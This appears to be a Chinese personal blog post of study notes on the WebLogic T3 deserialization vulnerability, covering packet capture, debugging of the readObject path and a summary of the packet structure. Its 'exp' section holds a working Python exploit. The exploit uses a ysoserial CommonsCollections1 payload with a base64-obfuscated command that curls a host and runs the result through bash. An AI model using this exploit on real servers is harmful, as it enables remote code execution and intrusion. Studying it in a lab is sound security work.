---
layout: post
title: Weblogic学习
categories: [blog ]
tags: [Java,]
description: ""
image:
  feature: windows.jpg
  credit: JYcxk
  creditlink: shzq
---

 

```java

```

### 环境配置

```java
https://tttang.com/user/RoboTerh  //直接参考这篇文章即可
https://bleke.top/posts/2831946175/  weblogic调试环境
```

### 抓包分析

![image-20240618141748571](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240618141748571.png)

第一步客户端向服务器发送请求头，得到服务端的响应
```java
t3 7.0.0.0   //标识协议版本号
AS:10        //标识发送序列化数据的容量
HL:19       

HELO:10.3.6.0.false   //weblogic版本号
AS:2048
HL:19
```

![image-20240618143102259](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240618143102259.png)

### 这里先提一个疑问叭初次的困点

这里直接发了个正确的poc到了readObject()这里， 但是想的是比如/cmd路由下访问才进行的readObject(),那么这里是

![image-20240618144900025](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240618144900025.png)呃呃呃好像明白了，就是在它程序启动的时候init()-->readMsgAbbrevs--->read->readObject调用的

### 调试步骤

```
从输入流var1中读取一个字节，并将其赋值给变量var2，该字节表示序列化对象的类型
```

![image-20240618145902485](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240618145902485.png)

继续看ServerChannelInputStream，是一个内部类，但是里面重写了**resolveClass()方法**

```
// 检查解析出来的Java类与要解析的类是否具有相同的serialVersionUID
```

![image-20240618150313202](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240618150313202.png)

其中在构造方法中，调用getServerChannel函数处理T3协议，获取socket相关信息
[  ](https://xzfile.aliyuncs.com/media/upload/picture/20231020163724-e48e54b0-6f23-1.png)
![image-20240618151333147](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240618151333147.png)


![image-20240618152245048](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240618152245048.png)

### exp

```java
from os import popen
import struct  # 负责大小端的转换
import subprocess
from sys import stdout
import socket
import re
import binascii

def generatePayload(gadget, cmd):
    YSO_PATH = "C:\\Users\\c'x'k\\Desktop\\yso\\ysoserial-master\\target\\ysoserial-0.0.6-SNAPSHOT-all.jar"
    popen = subprocess.Popen(['C:/Program Files/Java/jdk1.8.0_65/bin/java.exe', '-jar', YSO_PATH, gadget, cmd], stdout=subprocess.PIPE)
    return popen.stdout.read()

def T3Exploit(ip, port, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    handshake = "t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n"
    sock.sendall(handshake.encode())
    data = sock.recv(1024)
    data += sock.recv(1024)
    compile = re.compile("HELO:(.*).0.false")
    print(data.decode())
    match = compile.findall(data.decode())
    if match:
        print("Weblogic: " + "".join(match))
    else:
        print("Not Weblogic")
        return
    header = binascii.a2b_hex(b"00000000")
    t3header = binascii.a2b_hex(b"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006")
    desflag = binascii.a2b_hex(b"fe010000")
    payload = header + t3header + desflag + payload


    payload = struct.pack(">I", len(payload)) + payload[4:]

    print(payload)
    sock.send(payload)

if __name__ == "__main__":
    ip = "192.168.236.130"
    port = 7001
    gadget = "CommonsCollections1"
    cmd = "bash -c {echo,Y3VybCBodHRwOi8vMTkyLjE2OC4yMzYuMTMwOjQ0NDQ=}|{base64,-d}|{bash,-i}"
    payload = generatePayload(gadget, cmd)
    T3Exploit(ip, port, payload)
```

主要看T3Exploit中的方法
```java
看下图  前面的是长度，会在代码层面读取是否为0，为0会进入readObject方法内，然后后面是 aced005就是我们自己反序列化的东西
```

![image-20240618155623767](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240618155623767.png)

![image-20240618160701335](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240618160701335.png)

### 调用链子

![image-20240618171931171](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240618171931171.png)

## 总结一下

```java
其实就是 拼接 00000000 +T3头+反序列化对象前缀+恶意反序列化对象，然后下面struct.paack()就是重新计算加入恶意数据包的长度
WeblogicT3对RMI传递过来的数据处理过程非常复杂，分析起来可能会有点头疼，但只要始终记住，Weblogic处理数据时，会对数据按照序列化头部标识进行分片，并逐个反序列化，就明白为什么会触发恶意代码了。	
```

![image-20240618163233054](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240618163233054.png)



